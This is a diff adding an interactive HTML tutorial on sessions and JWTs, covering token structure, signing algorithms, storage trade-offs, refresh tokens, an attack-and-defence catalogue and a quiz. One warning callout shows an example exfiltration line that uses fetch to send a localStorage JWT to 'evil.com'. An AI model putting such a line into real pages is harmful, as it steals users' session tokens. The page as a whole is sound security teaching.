+        <div class="jwt-legend-item"><div class="legend-dot" style="background:#a78bfa"></div>Payload</div>
+        <div class="jwt-legend-item"><div class="legend-dot" style="background:#34d399"></div>Signature</div>
+        <div style="font-family:'DM Mono',monospace;font-size:0.65rem;color:#4b5563;margin-left:auto;">base64url encoded · separated by dots</div>
+      </div>
+    </div>
+
+    <div class="jwt-decoded">
+      <div class="decoded-part header-part">
+        <div class="decoded-title hdr">① Header</div>
+        <div class="decoded-json">
+          {<br>
+          &nbsp;<span class="json-key">"alg"</span>: <span class="json-str">"RS256"</span>,<br>
+          <span class="json-comment">&nbsp;// signing algorithm</span>
+          &nbsp;<span class="json-key">"typ"</span>: <span class="json-str">"JWT"</span><br>
+          <span class="json-comment">&nbsp;// always "JWT"</span>
+          }
+        </div>
+      </div>
+      <div class="decoded-part payload-part">
+        <div class="decoded-title pld">② Payload (Claims)</div>
+        <div class="decoded-json">
+          {<br>
+          &nbsp;<span class="json-key">"sub"</span>: <span class="json-str">"user_123"</span>,<br>
+          <span class="json-comment">&nbsp;// subject (user ID)</span>
+          &nbsp;<span class="json-key">"email"</span>: <span class="json-str">"alice@co"</span>,<br>
+          &nbsp;<span class="json-key">"roles"</span>: [<span class="json-str">"admin"</span>],<br>
+          &nbsp;<span class="json-key">"iat"</span>: <span class="json-val">1705328000</span>,<br>
+          <span class="json-comment">&nbsp;// issued at (Unix ts)</span>
+          &nbsp;<span class="json-key">"exp"</span>: <span class="json-val">1705331600</span>,<br>
+          <span class="json-comment">&nbsp;// expires at (+1hr)</span>
+          &nbsp;<span class="json-key">"iss"</span>: <span class="json-str">"https://auth…"</span><br>
+          <span class="json-comment">&nbsp;// issuer</span>
+          }
+        </div>
+      </div>
+      <div class="decoded-part sig-part">
+        <div class="decoded-title sig">③ Signature</div>
+        <div class="decoded-json">
+          RSASHA256(<br>
+          &nbsp;base64(header)<br>
+          &nbsp;+ "."<br>
+          &nbsp;+ base64(payload),<br>
+          &nbsp;<span style="color:var(--rose)">privateKey</span><br>
+          )<br><br>
+          <span class="json-comment">// Server verifies with publicKey</span>
+          <span class="json-comment">// Payload is NOT encrypted</span>
+          <span class="json-comment">// Anyone can read it!</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout danger">
+      <span class="callout-icon">🔴</span>
+      <div><strong>Critical misconception:</strong> JWT payload is <em>encoded</em>, not <em>encrypted</em>. Base64URL is trivially reversible — paste any JWT into jwt.io and read everything. <strong>Never put sensitive data</strong> (passwords, SSNs, secrets) in a JWT payload unless you use JWE (JSON Web Encryption).</div>
+    </div>
+
+    <div class="callout success">
+      <span class="callout-icon">✅</span>
+      <div>The signature does guarantee <strong>integrity</strong>: if anyone modifies the payload, the signature won't match and the server will reject it. Tamper-evident, not secret.</div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 05 CLAIMS ─── -->
+  <section class="section" id="s5">
+    <div class="section-num">05 — The Payload</div>
+    <h2>JWT Claims Reference</h2>
+    <p>Claims are statements about the user. Three categories: Registered (standardized), Public, and Private.</p>
+
+    <table class="claims-table">
+      <thead>
+        <tr><th>Claim</th><th>Full Name</th><th>Type</th><th>Meaning</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><span class="claim-name">iss</span></td><td>Issuer</td><td>Registered</td><td>Who created this token. E.g. <code>https://auth.myapp.com</code></td></tr>
+        <tr><td><span class="claim-name">sub</span></td><td>Subject</td><td>Registered</td><td>Who the token is about. Usually a user ID. Must be unique.</td></tr>
+        <tr><td><span class="claim-name">aud</span></td><td>Audience</td><td>Registered</td><td>Who the token is intended for. Server must check it matches.</td></tr>
+        <tr><td><span class="claim-name">exp</span></td><td>Expiration</td><td>Registered</td><td>Unix timestamp after which the token is invalid. Always check this.</td></tr>
+        <tr><td><span class="claim-name">nbf</span></td><td>Not Before</td><td>Registered</td><td>Token is not valid before this time. Prevents early use.</td></tr>
+        <tr><td><span class="claim-name">iat</span></td><td>Issued At</td><td>Registered</td><td>When the token was created. Useful for age checks.</td></tr>
+        <tr><td><span class="claim-name">jti</span></td><td>JWT ID</td><td>Registered</td><td>Unique ID for this token. Use to prevent replay attacks.</td></tr>
+        <tr><td><span class="claim-name">email</span></td><td>Email</td><td>Public (IANA)</td><td>User's email address. Common custom addition.</td></tr>
+        <tr><td><span class="claim-name">roles</span></td><td>Roles</td><td>Private</td><td>App-defined. Custom claims agreed between issuer and consumer.</td></tr>
+        <tr><td><span class="claim-name">scope</span></td><td>Scope</td><td>Public</td><td>OAuth scopes the token grants. E.g. <code>read:profile write:posts</code></td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout warn">
+      <span class="callout-icon">⚠️</span>
+      <div>Claim names are case-sensitive and short by design — JWTs are often sent in every request header, so <strong>size matters</strong>. Keep payloads lean. A large JWT can bloat every single HTTP request.</div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 06 ALGORITHMS ─── -->
+  <section class="section" id="s6">
+    <div class="section-num">06 — Cryptography</div>
+    <h2>Signing Algorithms</h2>
+
+    <p>The algorithm in the header determines how the signature is created and verified. This is one of the most security-critical choices.</p>
+
+    <div class="tab-bar">
+      <button class="tab active" onclick="switchTab(this,'symmetric')">Symmetric (HMAC)</button>
+      <button class="tab" onclick="switchTab(this,'asymmetric')">Asymmetric (RSA / EC)</button>
+    </div>
+
+    <div class="tab-panel active" id="tab-symmetric">
+      <p>One shared secret key — used for both signing and verification. If you control both sides (issuer and verifier), this is simpler and faster.</p>
+      <div class="algo-grid">
+        <div class="algo-card">
+          <div class="algo-name">HS256</div>
+          <div class="algo-type">HMAC + SHA-256</div>
+          <div class="algo-rec rec-ok">✓ Fine for simple cases</div>
+          <div class="algo-rec" style="margin-top:0.35rem;font-size:0.75rem;color:var(--muted);">Both sides share the secret. Can't distribute safely.</div>
+        </div>
+        <div class="algo-card">
+          <div class="algo-name">HS384</div>
+          <div class="algo-type">HMAC + SHA-384</div>
+          <div class="algo-rec rec-ok">✓ Stronger hash</div>
+        </div>
+        <div class="algo-card">
+          <div class="algo-name">HS512</div>
+          <div class="algo-type">HMAC + SHA-512</div>
+          <div class="algo-rec rec-ok">✓ Strongest HMAC</div>
+        </div>
+      </div>
+      <div class="callout warn">
+        <span class="callout-icon">⚠️</span>
+        <div><strong>The shared secret problem:</strong> If your API server and auth server both need the secret, you have to distribute it. Every place that holds the secret is an attack surface. If it leaks, anyone can forge JWTs.</div>
+      </div>
+    </div>
+
+    <div class="tab-panel" id="tab-asymmetric">
+      <p>A private key signs; the public key verifies. You can share the public key with everyone — only the private key can create valid tokens.</p>
+      <div class="algo-grid">
+        <div class="algo-card">
+          <div class="algo-name">RS256</div>
+          <div class="algo-type">RSA + SHA-256</div>
+          <div class="algo-rec rec-yes">★ Most common in prod</div>
+          <div class="algo-rec" style="margin-top:0.35rem;font-size:0.75rem;color:var(--muted);">Widely supported. Use 2048-bit+ keys.</div>
+        </div>
+        <div class="algo-card">
+          <div class="algo-name">RS512</div>
+          <div class="algo-type">RSA + SHA-512</div>
+          <div class="algo-rec rec-yes">✓ Stronger hash</div>
+        </div>
+        <div class="algo-card">
+          <div class="algo-name">ES256</div>
+          <div class="algo-type">ECDSA + P-256</div>
+          <div class="algo-rec rec-yes">★ Modern best choice</div>
+          <div class="algo-rec" style="margin-top:0.35rem;font-size:0.75rem;color:var(--muted);">Smaller keys, same security as RSA-3072. Faster.</div>
+        </div>
+        <div class="algo-card">
+          <div class="algo-name">PS256</div>
+          <div class="algo-type">RSA-PSS + SHA-256</div>
+          <div class="algo-rec rec-yes">✓ RSA best practice</div>
+          <div class="algo-rec" style="margin-top:0.35rem;font-size:0.75rem;color:var(--muted);">More secure than RS256. Slightly less supported.</div>
+        </div>
+        <div class="algo-card" style="border-color:var(--rose);border-top:3px solid var(--rose);">
+          <div class="algo-name" style="color:var(--rose);">none</div>
+          <div class="algo-type">No Signature</div>
+          <div class="algo-rec rec-no">✗ NEVER use</div>
+          <div class="algo-rec" style="margin-top:0.35rem;font-size:0.75rem;color:var(--rose);">Infamous attack vector. Many libraries used to accept it. Anyone could forge tokens.</div>
+        </div>
+      </div>
+      <div class="callout success">
+        <span class="callout-icon">✅</span>
+        <div><strong>Why asymmetric wins at scale:</strong> Your auth server holds the private key. Every microservice, third-party API, or CDN edge node can verify JWTs using just the public key — which you can publish openly (JWKS endpoint). Zero secret distribution problem.</div>
+      </div>
+    </div>
+
+    <div class="callout danger">
+      <span class="callout-icon">🔴</span>
+      <div><strong>The "alg: none" attack:</strong> Early JWT libraries would accept a token with <code>"alg": "none"</code> and no signature. An attacker could craft any payload, strip the signature, and gain access. Always explicitly whitelist allowed algorithms server-side. Never trust the header's <code>alg</code> blindly.</div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 07 STORAGE ─── -->
+  <section class="section" id="s7">
+    <div class="section-num">07 — The Great Debate</div>
+    <h2>Where to Store Tokens</h2>
+    <p>The most argued topic in web security. Every option has trade-offs.</p>
+
+    <div class="toggle-wrapper">
+      <button class="toggle-btn active" onclick="switchPanel(this,'localStorage')">localStorage</button>
+      <button class="toggle-btn" onclick="switchPanel(this,'cookie')">HttpOnly Cookie</button>
+      <button class="toggle-btn" onclick="switchPanel(this,'memory')">Memory</button>
+    </div>
+
+    <div class="compare-panel active" id="panel-localStorage">
+      <div class="two-col">
+        <div class="card green">
+          <div class="card-label">Pros</div>
+          <div class="card-body">
+            ✓ Easy to use via JS<br>
+            ✓ Works for cross-origin requests<br>
+            ✓ Simple to implement<br>
+            ✓ Persists across tabs/windows<br>
+            ✓ No CSRF risk (not sent automatically)
+          </div>
+        </div>
+        <div class="card rose">
+          <div class="card-label">Cons</div>
+          <div class="card-body">
+            ✗ <strong>XSS vulnerable</strong> — any injected JS reads it<br>
+            ✗ One script inclusion = token stolen<br>
+            ✗ No isolation from third-party scripts<br>
+            ✗ Persists even after "logout" if not cleared
+          </div>
+        </div>
+      </div>
+      <div class="callout danger">
+        <span class="callout-icon">🔴</span>
+        <div><strong>The XSS nightmare:</strong> Your site runs 47 npm packages. One gets compromised and injects <code>fetch('evil.com?t='+localStorage.getItem('jwt'))</code>. Every user's token is now stolen. localStorage is the #1 JWT storage mistake.</div>
+      </div>
+    </div>
+
+    <div class="compare-panel" id="panel-cookie">
+      <div class="two-col">
+        <div class="card green">
+          <div class="card-label">Pros</div>
+          <div class="card-body">
+            ✓ <strong>HttpOnly</strong>: JS cannot read it at all<br>
+            ✓ XSS can't steal the token<br>
+            ✓ <strong>Secure</strong>: HTTPS only<br>
+            ✓ Automatic expiry management<br>
+            ✓ SameSite protects against CSRF
+          </div>
+        </div>
+        <div class="card rose">
+          <div class="card-label">Cons</div>
+          <div class="card-body">
+            ✗ CSRF risk (mitigated by SameSite)<br>
+            ✗ Cross-origin complications<br>
+            ✗ Mobile apps need workarounds<br>
+            ✗ Domain-scoped (third-party cookie issues)
+          </div>
+        </div>
+      </div>
+      <div class="callout success">
+        <span class="callout-icon">✅</span>
+        <div><strong>Industry recommendation (2024):</strong> Store JWTs in <code>HttpOnly; Secure; SameSite=Strict</code> cookies. Use a short-lived access token + long-lived refresh token in separate cookies. This is the dominant secure pattern for web apps.</div>
+      </div>
+    </div>
+
+    <div class="compare-panel" id="panel-memory">
+      <div class="two-col">
+        <div class="card green">
+          <div class="card-label">Pros</div>
+          <div class="card-body">
+            ✓ Most XSS-resistant option<br>
+            ✓ Gone on page close (no persistence attack)<br>
+            ✓ No CSRF risk<br>
+            ✓ No storage API required
+          </div>
+        </div>
+        <div class="card rose">
+          <div class="card-label">Cons</div>
+          <div class="card-body">
+            ✗ Lost on page refresh — user logged out<br>
+            ✗ Requires refresh token in HttpOnly cookie to restore<br>
+            ✗ Complex to implement correctly<br>
+            ✗ Doesn't persist across tabs
+          </div>
+        </div>
+      </div>
+      <div class="analogy">
+        <strong>🧠 Best of both worlds pattern:</strong> Store the access token in memory (JS variable). Store the refresh token in an HttpOnly cookie. On page load, silently call <code>/refresh</code> to get a new access token from the refresh token cookie. Fast, secure, seamless.
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 08 COMPARISON ─── -->
+  <section class="section" id="s8">
+    <div class="section-num">08 — The Big Decision</div>
+    <h2>Sessions vs JWTs: The Full Picture</h2>
+
+    <table class="big-table">
+      <thead>
+        <tr><th>Dimension</th><th>Server Sessions</th><th>JWT Tokens</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><strong>Server state</strong></td><td class="partial">Stateful — server stores session</td><td class="yes">Stateless — server stores nothing</td></tr>
+        <tr><td><strong>Scalability</strong></td><td class="partial">Needs shared session store (Redis) across servers</td><td class="yes">Each server independently validates. No shared state.</td></tr>
+        <tr><td><strong>Instant revocation</strong></td><td class="yes">✓ Delete session record → immediate logout</td><td class="no">✗ Must wait for expiry, or maintain blocklist</td></tr>
+        <tr><td><strong>Database hit per request</strong></td><td class="no">Yes (unless cached)</td><td class="yes">No — validation is pure computation</td></tr>
+        <tr><td><strong>Payload size</strong></td><td class="yes">Tiny cookie (just an ID)</td><td class="no">Larger — all claims encoded in token</td></tr>
+        <tr><td><strong>Cross-domain / Microservices</strong></td><td class="no">Harder — session store must be shared</td><td class="yes">Easy — any service can validate with public key</td></tr>
+        <tr><td><strong>Mobile APIs</strong></td><td class="partial">Workable but awkward</td><td class="yes">Native — Bearer tokens in Authorization header</td></tr>
+        <tr><td><strong>User data freshness</strong></td><td class="yes">Always fresh — read from DB/store</td><td class="no">Stale until token refreshed — roles changes lag</td></tr>
+        <tr><td><strong>Logout complexity</strong></td><td class="yes">Simple — delete session</td><td class="no">Hard — need blocklist or short expiry</td></tr>
+        <tr><td><strong>Implementation complexity</strong></td><td class="yes">Low — battle-tested libraries</td><td class="partial">Medium — more moving parts</td></tr>
+        <tr><td><strong>Best for</strong></td><td>Traditional web apps, admin panels, anything needing instant revocation</td><td>APIs, microservices, mobile apps, multi-tenant SaaS</td></tr>
+      </tbody>
+    </table>
+
+    <div class="analogy">
+      <strong>🤔 Which should you use?</strong><br><br>
+      <strong>Sessions:</strong> You're building a traditional web app, you need instant revocation (banking, healthcare), or you're a small team who wants simplicity.<br><br>
+      <strong>JWT:</strong> You're building an API consumed by mobile/SPAs, you have microservices that all need to verify identity, or you're working across multiple domains/origins.<br><br>
+      <strong>Both:</strong> Many production systems use JWT for API authentication AND sessions for the web frontend. Not mutually exclusive.
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 09 REFRESH ─── -->
+  <section class="section" id="s9">
+    <div class="section-num">09 — The Pattern</div>
+    <h2>The Refresh Token Pattern</h2>
+
+    <p>Access tokens should be short-lived (15 minutes). But you don't want users re-logging in every 15 minutes. Enter: refresh tokens.</p>
+
+    <div class="two-col">
+      <div class="card amber">
+        <div class="card-label">Access Token</div>
+        <div class="card-title">Short-lived · ~15 mins</div>
+        <div class="card-body">Sent with every API request. If stolen, damage window is tiny. Lives in memory or HttpOnly cookie. Validates statelessly.</div>
+      </div>
+      <div class="card teal">
+        <div class="card-label">Refresh Token</div>
+        <div class="card-title">Long-lived · days/weeks</div>
+        <div class="card-body">Used only to get new access tokens. Never sent to API servers. Stored in HttpOnly cookie. Server stores it — can be revoked instantly.</div>
+      </div>
+    </div>
+
+    <div class="flow-box" style="margin-top:1rem;">
+      <div style="font-family:'DM Mono',monospace;font-size:0.65rem;letter-spacing:0.15em;text-transform:uppercase;color:var(--muted);margin-bottom:1.25rem;">Refresh Flow</div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-browser">📤</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Client</div>
+          <div class="flow-title">Access token expires (401 response)</div>
+          <div class="flow-desc">API returns 401 Unauthorized. Client catches this.</div>
+          <div class="flow-expand">Good clients implement an interceptor (Axios, fetch wrapper) that automatically catches 401s and triggers the refresh flow, then retries the original request — transparent to the user.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-browser">🔄</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Client → Auth Server</div>
+          <div class="flow-title">POST /refresh with refresh token cookie</div>
+          <div class="flow-desc">Silent request to the auth server. Browser sends the HttpOnly refresh token cookie automatically.</div>
+          <div class="flow-expand">This call goes only to the auth server, not to your API. The refresh token never touches your API servers. Use Refresh Token Rotation: issue a new refresh token on every use and invalidate the old one.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-server">✅</div><div class="flow-connector"></div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Auth Server</div>
+          <div class="flow-title">Validates, issues new access token</div>
+          <div class="flow-desc">Auth server validates the refresh token against its store, then returns a fresh access token.</div>
+          <div class="flow-expand">Because refresh tokens are stored server-side, they CAN be instantly revoked (unlike access tokens). This is how "log out all devices" works — revoke all refresh tokens for a user. If a refresh token is used twice (detected reuse), it should be treated as a compromise signal and all tokens for that user revoked.</div>
+        </div>
+      </div>
+
+      <div class="flow-row" onclick="toggleFlow(this)">
+        <div class="flow-side"><div class="flow-node n-browser">🚀</div></div>
+        <div class="flow-content">
+          <div class="flow-actor">Client</div>
+          <div class="flow-title">Retries original request with new token</div>
+          <div class="flow-desc">Original API call succeeds. User never noticed the refresh happened.</div>
+          <div class="flow-expand">This seamless experience is why SPAs use this pattern. The user feels like they're always logged in, even though their access token technically expired. The refresh window (days/weeks) is their real session length.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <span class="callout-icon">ℹ️</span>
+      <div><strong>Refresh Token Rotation:</strong> Each time a refresh token is used, invalidate it and issue a new one. If an old refresh token is used again, it means it was either stolen or the legitimate client has a bug — treat it as a security incident and revoke all tokens for that user.</div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 10 SECURITY ─── -->
+  <section class="section" id="s10">
+    <div class="section-num">10 — Threat Landscape</div>
+    <h2>Security Attacks & Defences</h2>
+    <p>Click any card to see the defence.</p>
+
+    <div class="security-grid">
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-crit">Critical</span>
+        <div class="sec-name">XSS Token Theft</div>
+        <div class="sec-body">Injected script reads localStorage and exfiltrates your JWT to an attacker server.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Store tokens in HttpOnly cookies (JS-inaccessible). Implement a strict Content Security Policy (CSP). Sanitize all user-generated content. Audit npm dependencies.</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-crit">Critical</span>
+        <div class="sec-name">CSRF Attack</div>
+        <div class="sec-body">Attacker tricks your browser into making authenticated requests to your app from their site. Cookie sent automatically.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Use <code>SameSite=Strict</code> or <code>Lax</code> cookies. For sensitive actions, also use CSRF tokens (Double Submit Cookie pattern). JWT in Authorization header is naturally CSRF-immune.</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-crit">Critical</span>
+        <div class="sec-name">Algorithm Confusion</div>
+        <div class="sec-body">Attacker changes header from RS256 to HS256 and signs with the public key (which they know). Naive servers accept it.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Always explicitly specify which algorithms to accept on the server. Never derive the algorithm from the token's header. Whitelist: <code>allowedAlgorithms: ['RS256']</code>.</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-high">High</span>
+        <div class="sec-name">JWT Replay Attack</div>
+        <div class="sec-body">Attacker intercepts a valid, non-expired JWT and uses it to make requests as the victim.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Short expiry times (15 min). Use the <code>jti</code> claim with a blocklist for truly sensitive operations. HTTPS everywhere (prevents interception). Bind tokens to IP or fingerprint (controversial).</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-high">High</span>
+        <div class="sec-name">Session Fixation</div>
+        <div class="sec-body">Attacker sets a known session ID before authentication. After the victim logs in, attacker uses that session.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Always generate a new session ID upon successful authentication. Never reuse pre-login session IDs. Regenerate after privilege changes too.</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-high">High</span>
+        <div class="sec-name">Session Hijacking</div>
+        <div class="sec-body">Session cookie stolen via network sniffing (HTTP), XSS, or malware. Attacker takes over the session.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Always use HTTPS (Secure cookie flag). HttpOnly prevents XSS reads. Validate User-Agent and IP binding (soft). Short session timeouts. Re-auth for sensitive operations.</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-med">Medium</span>
+        <div class="sec-name">JWT None Algorithm</div>
+        <div class="sec-body">Server accepts <code>"alg": "none"</code> — attacker creates unsigned tokens with arbitrary claims.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Use a well-maintained JWT library. Explicitly reject "none". Many modern libraries reject it by default but always verify this in your configuration.</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-med">Medium</span>
+        <div class="sec-name">Weak Secret Key</div>
+        <div class="sec-body">HMAC secret is too short or predictable. Attacker brute-forces it offline after intercepting a JWT.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Use at least 256-bit (32-byte) random secrets for HS256. Better yet, use RS256/ES256 (asymmetric) where the "secret" is a private key that never needs to be shared.</div>
+      </div>
+
+      <div class="sec-card" onclick="this.classList.toggle('active')">
+        <span class="sec-sev sev-med">Medium</span>
+        <div class="sec-name">Stale Claims / Privilege Lag</div>
+        <div class="sec-body">User is fired or demoted, but their JWT still carries admin claims until it expires.</div>
+        <div class="sec-detail">🛡️ <strong>Defence:</strong> Short expiry (15 min). For immediate revocation: maintain a token blocklist keyed by <code>jti</code>. Or use opaque tokens for sensitive resources and check server-side state. Accept the trade-off consciously.</div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="divider">
+
+  <!-- ─── 11 QUIZ ─── -->
+  <section class="section" id="s11">
+    <div class="section-num">11 — Test Yourself</div>
+    <h2>Quick Quiz</h2>
+
+    <div class="quiz-wrap">
+      <div id="quiz-root"></div>
+    </div>
+  </section>
+
+</div>
+
+<script>
+// Intersection observer
+const io = new IntersectionObserver(entries => {
+  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+}, { threshold: 0.08 });
+document.querySelectorAll('.section').forEach(s => io.observe(s));
+
+// Flow expand
+function toggleFlow(el) {
+  el.querySelector('.flow-expand').classList.toggle('open');
+}
+
+// Tab switch
+function switchTab(btn, id) {
+  btn.closest('.section, div').querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  btn.classList.add('active');
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('tab-' + id).classList.add('active');
+}
+
+// Panel toggle
+function switchPanel(btn, id) {
+  btn.closest('.section').querySelectorAll('.toggle-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  btn.closest('.section').querySelectorAll('.compare-panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('panel-' + id).classList.add('active');
+}
+
+// Quiz
+const Qs = [
+  {
+    q: "Why can't the server 'remember' you between HTTP requests by default?",
+    opts: ["HTTP is encrypted and stateless","HTTP is a stateless protocol — each request is independent","The server deletes cookies automatically","TCP connections reset each time"],
+    a: 1,
+    exp: "Correct! HTTP is stateless by design. Sessions, cookies, and tokens are all workarounds built on top to simulate continuity."
+  },
+  {
+    q: "What does 'Base64URL encoding' of a JWT payload mean for security?",
+    opts: ["The payload is encrypted and unreadable","The payload is compressed to save bandwidth","The payload is only encoded — anyone can decode and read it","The payload is hashed and one-way transformed"],
+    a: 2,
+    exp: "Right! Base64URL is trivially reversible. The JWT payload is readable by anyone. Never store secrets in it."
+  },
+  {
+    q: "Why do asymmetric algorithms (RS256, ES256) scale better than symmetric (HS256)?",
+    opts: ["They use bigger keys","The public key can be shared openly — any service can verify without knowing the private key","They encrypt the payload","They don't require a signing step"],
+    a: 1,
+    exp: "Exactly! With RS256/ES256, only the auth server needs the private key. Every other service just uses the public key — no secret distribution problem."
+  },
+  {
+    q: "What's the biggest danger of storing JWTs in localStorage?",
+    opts: ["It's slower than cookies","Any XSS attack can read localStorage and steal the token","It doesn't persist across sessions","The JWT becomes too large for localStorage"],
+    a: 1,
+    exp: "Correct! localStorage is accessible to any JavaScript on the page. An XSS vulnerability anywhere on your site — including in a third-party script — can steal every user's token."
+  },
+  {
+    q: "What problem do refresh tokens solve?",
+    opts: ["They encrypt the access token","They allow long user sessions while keeping access tokens short-lived and limiting damage if stolen","They prevent CSRF attacks","They compress the JWT payload"],
+    a: 1,
+    exp: "Yes! Short-lived access tokens limit the damage window if stolen. Refresh tokens allow seamless session extension without re-login, and can be instantly revoked server-side."
+  },
+  {
+    q: "A user is fired. They have a JWT with 14 minutes left. Can you immediately invalidate it?",
+    opts: ["Yes, just delete their account","Not without a server-side blocklist or waiting for expiry — pure JWTs are stateless","Yes, just rotate the signing key","Yes, update the exp claim in the token"],
+    a: 1,
+    exp: "Correct — this is the core JWT trade-off! The token is self-contained. Without a blocklist (which re-adds statefulness), you must wait for expiry. This is why access tokens should be very short-lived."
+  },
+  {
+    q: "What is the 'alg: none' JWT attack?",
+    opts: ["Attacker uses an empty payload","Attacker sets algorithm to none, removes the signature, and some servers accept unsigned tokens with arbitrary claims","Attacker replaces RS256 with HS256","Attacker deletes the header entirely"],
+    a: 1,
+    exp: "Exactly! This was a real vulnerability in early JWT libraries. Always explicitly whitelist allowed algorithms server-side and never derive them from the token header."
+  }
+];
+
+let cur = 0, score = 0, done = false;
+
+function renderQ() {
+  const q = Qs[cur];
+  document.getElementById('quiz-root').innerHTML = `
+    <div class="quiz-q">Q${cur+1}/${Qs.length} — ${q.q}</div>
+    <div class="quiz-opts">
+      ${q.opts.map((o,i) => `<div class="quiz-opt" onclick="pick(${i})">${o}</div>`).join('')}
+    </div>
+    <div class="quiz-fb" id="qfb"></div>
+    <div class="quiz-footer">
+      <button class="q-btn q-btn-primary" id="qnext" style="display:none" onclick="next()">Next →</button>
+      <span class="q-counter">Score: ${score}/${cur} ${cur>0?'· '+Math.round(score/cur*100)+'%':''}</span>
+    </div>
+  `;
+  done = false;
+}
+
+function pick(i) {
+  if (done) return;
+  done = true;
+  const q = Qs[cur];
+  document.querySelectorAll('.quiz-opt').forEach((o,idx) => {
+    if (idx === q.a) o.classList.add('correct');
+    else if (idx === i) o.classList.add('wrong');
+  });
+  if (i === q.a) score++;
+  document.getElementById('qfb').textContent = (i === q.a ? '✅ ' : '❌ ') + q.exp;
+  document.getElementById('qnext').style.display = 'inline-block';
+}
+
+function next() {
+  cur++;
+  if (cur >= Qs.length) {
+    const pct = Math.round(score/Qs.length*100);
+    document.getElementById('quiz-root').innerHTML = `
+      <div style="text-align:center;padding:2rem 0;">
+        <div style="font-size:3rem;margin-bottom:1rem">${pct>=85?'🏆':pct>=60?'💪':'📚'}</div>
+        <div style="font-family:'DM Serif Display',serif;font-size:2rem;color:#fff;margin-bottom:0.4rem">${score}/${Qs.length} · ${pct}%</div>
+        <div style="color:#6b7280;margin-bottom:1.5rem;font-size:0.93rem">
+          ${pct>=85?'You understand sessions and JWTs deeply. Go build something.':pct>=60?'Solid foundation. Review the refresh token pattern and security sections.':'Sessions and JWTs have a lot of nuance — re-read and try again!'}
+        </div>
+        <button class="q-btn q-btn-primary" onclick="cur=0;score=0;renderQ()">Try Again</button>
+      </div>
+    `;
+  } else { renderQ(); }
+}
+
+renderQ();
+</script>
+</body>
+</html>
